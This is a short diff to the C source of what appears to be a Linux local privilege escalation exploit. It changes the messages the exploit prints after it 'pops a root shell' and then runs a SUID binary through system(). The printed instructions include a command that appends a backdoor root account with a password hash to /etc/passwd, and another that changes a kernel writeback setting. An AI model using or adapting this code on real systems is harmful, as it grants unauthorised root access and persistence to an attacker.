@@ -122,8 +122,8 @@ void *waitForWrite(void *arg) {
 
     printf("Popping root shell.\n");
     printf("Don't forget to restore /tmp/bak\n");
-    printf("[!] Run below command :\necho 0 > /proc/sys/vm/dirty_writeback_centisecs\n");
-    printf("[*] Run below command :\necho lourcode:fiexYU42CCtOs:0:0:pwned:/root:/bin/bash >> /etc/passwd\n");
+    printf("[!!!!!!!!] Run below command :\necho 0 > /proc/sys/vm/dirty_writeback_centisecs\n");
+    printf("[*] echo lourcode:fiexYU42CCtOs:0:0:pwned:/root:/bin/bash >> /etc/passwd\n");
 
     system(suid_binary);
 }
